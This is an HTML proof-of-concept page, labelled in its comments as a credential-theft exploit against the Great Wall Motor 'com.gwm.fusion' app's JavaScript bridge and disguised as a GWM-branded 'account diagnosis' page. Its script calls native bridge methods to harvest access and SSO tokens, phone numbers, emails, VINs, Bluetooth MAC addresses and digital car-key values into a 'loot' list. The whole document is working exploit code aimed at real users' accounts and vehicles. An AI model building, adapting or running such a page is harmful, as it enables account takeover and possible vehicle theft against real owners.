<!DOCTYPE html>
<!--
  ============================================================================
   com.gwm.fusion  JS Bridge 凭据窃取 PoC v3 (诊断版)
  ----------------------------------------------------------------------------
   v3 目的: 定位 userInfo 为何无数据(userCarInfo 已实证可通)
   关键事实: userCarInfo(line2099) 和 userInfo(line2115) 同类、同@注解、
     同同步签名(Object)->JSONObject,无异步重载。userCarInfo能通 → userInfo
     在协议层必能命中。无数据 → 99%是PoC的返回值解析bug,非方法无法调用。
   v3 改进:
     1. userInfo 单独诊断:打印原始返回字符串(不parse),分别试同步+异步
     2. 同步返回值区分: 对象 / 原始字符串 / {"code":-1} / {"code":-999} / 空
     3. tryParse 不吞异常:JSON.parse 失败时保留原始串展示
     4. 同时保留 userCarInfo(锚点) 和 getAllCarsInfo(车辆全字段含bleMacAddress)
  ============================================================================
-->
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>长城汽车 · 诊断</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,"PingFang SC",sans-serif;background:#0b1f3a;color:#fff;
       min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
  .logo{font-size:20px;font-weight:700;margin:10px 0}
  .card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);
        border-radius:14px;padding:20px;width:100%;max-width:440px;margin-top:14px}
  h3{font-size:16px;color:#ffd24a;margin-bottom:8px}
  .btn{margin-top:14px;padding:11px 0;width:100%;border:none;border-radius:10px;
       background:linear-gradient(90deg,#c8102e,#e23a4a);color:#fff;font-size:15px;font-weight:600;cursor:pointer}
  .log{margin-top:12px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;
       color:#8be9a0;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;
       background:rgba(0,0,0,.3);border-radius:8px;padding:10px}
</style>
</head>
<body>
<div class="logo">长城汽车 GWM</div>
<div class="card">
  <h3>账号诊断</h3>
  <button class="btn" onclick="run()">开始</button>
  <div class="log" id="log">[等待]</div>
</div>

<script>
/* dsbridge polyfill (按 PWebView 真实协议) */
(function(){
  if (window.dsBridge) return;
  var msgID = 0, cbs = {};
  function mkArg(a){ if(a===undefined||a===null) return '{}';
    if(typeof a==='string') return a; return JSON.stringify(a); }
  function call(method, arg, cb){
    var argStr = mkArg(arg), ret = null;
    try { ret = window._dsbridge.call(method, argStr); } catch(e){ ret = null; }
    if (ret !== null && ret !== undefined && ret !== '') {
      if (cb) { try { cb(ret, true); } catch(e){} return; }   // v3: 不预parse,原样传
      return ret;
    }
    if (cb) {
      msgID++;
      cbs[msgID] = { cb: cb, complete: false };
      var asyncArg; try { asyncArg = JSON.parse(argStr); } catch(e){ asyncArg = {}; }
      asyncArg._dscbstub = '["' + msgID + '"]';
      try { window._dsbridge.call(method, JSON.stringify(asyncArg)); }
      catch(e){ try{cb(null,true);}catch(_){} }
    }
    return null;
  }
  window._handleMessageFromNative = function(jsonStr){
    try {
      var m = (typeof jsonStr==='string')?JSON.parse(jsonStr):jsonStr;
      var entry = cbs[m.callbackId];
      if (!entry) return;
      var data = (m.data !== undefined) ? m.data : m;
      try { entry.cb(data, m.complete !== false); } catch(e){}
      if (m.complete !== false) delete cbs[m.callbackId];
    } catch(e){}
  };
  try { window._dsb && window._dsb.dsinit && window._dsb.dsinit({}); } catch(e){}
  window.dsBridge = { call: call };
})();

var LOG = document.getElementById('log');
var loot = [];
function out(s){ LOG.textContent += '\n' + s; }

/* 原始返回 → 结构化展示(不丢信息) */
function describe(methodName, ret){
  if (ret === null || ret === undefined) return methodName + ' → 返回 null/undefined(无同步值,可能异步)';
  if (typeof ret === 'object'){
    // 已经是对象
    if (ret.code === -1) return methodName + ' → {"code":-1} (dsbridge未命中,namespace错?)';
    if (ret.code === -999) return methodName + ' → {"code":-999} ' + (ret.message||'') + ' (进了方法体,参数错)';
    return null;   // 正常对象,外层处理
  }
  // 字符串 → 尝试parse
  var s = String(ret);
  if (s === '{"code":-1}' || s === '{"code":-1,}') return methodName + ' → 字符串 {"code":-1} (未命中)';
  var parsed;
  try { parsed = JSON.parse(s); }
  catch(e){
    return methodName + ' → 非JSON字符串(len=' + s.length + '): ' + s.substring(0,200) + (s.length>200?'...':'');
  }
  if (parsed && typeof parsed === 'object'){
    if (parsed.code === -1) return methodName + ' → parse后 {"code":-1} (未命中)';
    if (parsed.code === -999) return methodName + ' → parse后 {"code":-999} ' + (parsed.message||'');
    return null;   // parse成功,外层处理
  }
  return methodName + ' → 未知: ' + s.substring(0,200);
}

function fmtTokens(obj, prefix){
  if (!obj || typeof obj !== 'object') return prefix + ' ' + JSON.stringify(obj);
  return prefix +
    '\n  accessToken: ' + (obj.accessToken||'-') +
    '\n  ssoToken: ' + (obj.ssoToken||'-') +
    '\n  ptToken: ' + (obj.ptToken||'-') +
    '\n  gToken: ' + (obj.gToken||'-') +
    '\n  tokenId: ' + (obj.tokenId||'-') +
    '\n  userId: ' + (obj.userId||'-') +
    '\n  phone: ' + (obj.phone||'-') +
    '\n  email: ' + (obj.email||'-') +
    '\n  nickName: ' + (obj.nickName||'-') +
    '\n  isLogin: ' + (obj.isLogin===undefined?'-':obj.isLogin) +
    '\n  isTspLogin: ' + (obj.isTspLogin===undefined?'-':obj.isTspLogin) +
    '\n  原始JSON: ' + JSON.stringify(obj);
}

function run(){
  LOG.textContent = '[运行中...]';
  loot = [];
  var NS = null;

  /* ① 用 userCarInfo 锁定 namespace (已知可通) */
  out('[1] 锁定命名空间...');
  var nss = ['GwmController','Controller','NativeController','Storage'];
  for (var i=0;i<nss.length;i++){
    var n = nss[i];
    try {
      var r = dsBridge.call(n + '.userCarInfo');
      if (r && typeof r === 'object' && (r.beantechToken || r.ssoToken || r.navinfoToken)) {
        NS = n; out('[+] 命中命名空间: ' + NS); break;
      }
      // 可能返回字符串,试parse
      if (typeof r === 'string'){
        try { var p = JSON.parse(r);
          if (p && (p.beantechToken||p.ssoToken||p.navinfoToken)){ NS=n; out('[+] 命中命名空间(字符串parse): '+NS); break; }
        } catch(e){}
      }
    } catch(e){}
  }
  if (!NS){ NS='GwmController'; out('[!] 未自动锁定,用 ' + NS + ' 继续'); }

  /* ② userCarInfo 锚点 (已实证可通) */
  out('[2] userCarInfo (锚点)...');
  try {
    var c = dsBridge.call(NS + '.userCarInfo');
    loot.push(fmtTokens(c ? (typeof c==='string'?JSON.parse(c):c) : null, '[userCarInfo] ✅') );
  } catch(e){ loot.push('[userCarInfo] 异常: ' + e); }

  /* ③ userInfo 诊断 (重点) */
  out('[3] userInfo 诊断...');
  // 尝试1: 同步直取,原始返回
  try {
    var u = dsBridge.call(NS + '.userInfo');
    var d = describe('userInfo(同步)', u);
    if (d) loot.push(d);   // 未命中或异常结构
    else loot.push(fmtTokens(typeof u==='string'?JSON.parse(u):u, '[userInfo] ✅(同步)'));
  } catch(e){ loot.push('[userInfo] 同步异常: ' + e); }

  // 尝试2: 异步带回调(以防该方法被dsbridge当异步处理)
  try {
    dsBridge.call(NS + '.userInfo', {}, function(r, done){
      var d2 = describe('userInfo(异步)', r);
      if (d2) loot.push(d2);
      else loot.push(fmtTokens(typeof r==='string'?JSON.parse(r):r, '[userInfo] ✅(异步回调)'));
      if (done) flush();
    });
  } catch(e){ loot.push('[userInfo] 异步异常: ' + e); }

  /* ④ getAllCarsInfo — 所有车全字段(含 bleMacAddress / bluetoothKeyNew) */
  out('[4] getAllCarsInfo...');
  try {
    var cars = dsBridge.call(NS + '.getAllCarsInfo');
    if (cars && typeof cars === 'string'){ try { cars = JSON.parse(cars); } catch(e){} }
    if (Array.isArray(cars)){
      loot.push('[getAllCarsInfo] ✅ 共' + cars.length + '辆车');
      cars.forEach(function(car, idx){
        if (car && typeof car === 'object'){
          loot.push('  车#' + (idx+1) + ': vin=' + (car.vin||'-') +
                    ' bleMacAddress=' + (car.bleMacAddress||'-') +
                    ' bluetoothKeyNew=' + (car.bluetoothKeyNew||'-') +
                    ' bluetoothSupplier=' + (car.bluetoothSupplier||'-') +
                    ' licenseNumber=' + (car.licenseNumber||'-'));
        }
      });
    } else {
      loot.push('[getAllCarsInfo] ' + describe('getAllCarsInfo', cars));
    }
  } catch(e){ loot.push('[getAllCarsInfo] 异常: ' + e); }

  /* ⑤ appInfo / defaultCarVin / currentEnv */
  out('[5] 其他...');
  try { loot.push('[appInfo] ' + describe('appInfo', dsBridge.call(NS+'.appInfo'))); } catch(e){}
  try { loot.push('[defaultCarVin] ' + describe('defaultCarVin', dsBridge.call(NS+'.defaultCarVin')); } catch(e){}
  try { loot.push('[currentEnv] ' + describe('currentEnv', dsBridge.call(NS+'.currentEnv')); } catch(e){}

  flush();
  setTimeout(flush, 2500);   // 异步回调兜底
}

function flush(){
  var text = '\n========== 结果 ==========\n' + loot.join('\n\n') + '\n==========================';
  out(text);
  alert('【GWM JSB 诊断 v3】\n' + text +
        '\n\n请把 userInfo 那段原始返回贴回,我据此判断是调用约定问题还是方法真的不通。');
}
</script>
</body>
</html>
